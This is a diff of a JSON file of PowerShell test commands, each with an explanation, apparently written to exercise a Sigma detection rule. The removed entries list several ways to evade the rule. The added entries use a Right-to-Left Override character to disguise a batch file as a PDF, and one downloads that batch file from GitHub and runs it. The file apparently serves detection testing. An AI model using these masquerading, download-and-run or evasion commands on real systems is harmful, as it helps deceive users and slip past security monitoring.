@@ -1,26 +1,10 @@
 [
   {
-    "output": "powershell.exe -Command \"Write-Host (\\\"[char]\\\" 0x41)\"",
-    "explanation": "This command uses the [char] type with hexadecimal notation, which is directly detected by the Sigma rule. It is a true positive."
+    "output": "powershell.exe -Command \"& { $rtlo = [char]0x202E; $fileloc = Join-Path (\"$env:USERPROFILE\\Desktop\") (\"evil_batch\" + $rtlo + \"fdp.bat\"); Set-Content -Path $fileloc -Value @' @echo off echo Hello World! timeout /t 30 /nobreak exit '@ -Encoding Ascii -Force }\"",
+    "explanation": "This command uses [char]0x syntax to create a Right-to-Left Override (RTLO) character, which is a key element of the Sigma rule. The command is restructured using equivalent syntax and reordered arguments while preserving the same behavior. It avoids unnecessary variables and uses a here-string for the payload to maintain readability and test validity."
   },
   {
-    "output": "powershell.exe -Command \"Write-Host ([System.Char]0x41)\"",
-    "explanation": "This command uses the fully qualified [System.Char] type with hexadecimal notation, which is also detected by the Sigma rule. It is a true positive."
-  },
-  {
-    "output": "powershell.exe -Command \"Write-Host (\\\"[char]\\\" 65)\"",
-    "explanation": "This command uses [char] with decimal notation instead of hexadecimal. Since the Sigma rule specifically looks for '0x' in the command line, this bypasses the detection by omitting the hexadecimal format."
-  },
-  {
-    "output": "powershell.exe -Command \"Write-Host ([Convert]::ToChar(0x41))\"",
-    "explanation": "This command uses the [Convert]::ToChar method instead of [char] casting. The Sigma rule does not detect this syntax, making it a potential bypass."
-  },
-  {
-    "output": "powershell.exe -Command \"Write-Host ([char]([Convert]::ToInt32(\\\"A\\\", 16)))\"",
-    "explanation": "This command converts the hexadecimal value indirectly by converting the string 'A' to an integer using base 16. The Sigma rule does not detect this obfuscated method."
-  },
-  {
-    "output": "powershell.exe -Command \"Write-Host ([char](0x41))\"",
-    "explanation": "This command uses parentheses to enclose the hexadecimal value. The Sigma rule does not detect this variation of syntax."
+    "output": "powershell.exe -Command \"& { $rtlo = [char]0x202E; $fileloc = Join-Path $env:USERPROFILE\\Downloads (\"evil_batch\" + $rtlo + \"fdp.bat\"); Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat' -OutFile $fileloc -UseBasicParsing | Out-Null; Start-Process -FilePath $fileloc }\"",
+    "explanation": "This command uses [char]0x syntax to create an RTLO character and maintains the same behavior as the original. It applies reordering and omission of unnecessary elements while ensuring the command remains valid and testable. The command is structured to mimic real-world scenarios while staying within safe mutation boundaries."
   }
 ]
